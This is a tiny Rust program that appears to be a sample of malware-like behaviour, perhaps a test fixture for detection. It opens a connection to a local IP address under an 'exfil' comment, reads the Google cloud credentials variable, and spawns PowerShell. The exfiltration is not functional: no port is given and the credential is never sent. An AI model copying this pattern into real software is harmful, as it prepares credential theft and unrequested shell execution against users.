use std::env;
use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("192.168.1.1") { /* exfil */ }
    let _v = env::var("GOOGLE_APPLICATION_CREDENTIALS").unwrap_or_default();
    Command::new("powershell").arg("-Command").arg("Get-Process").spawn().ok();
}
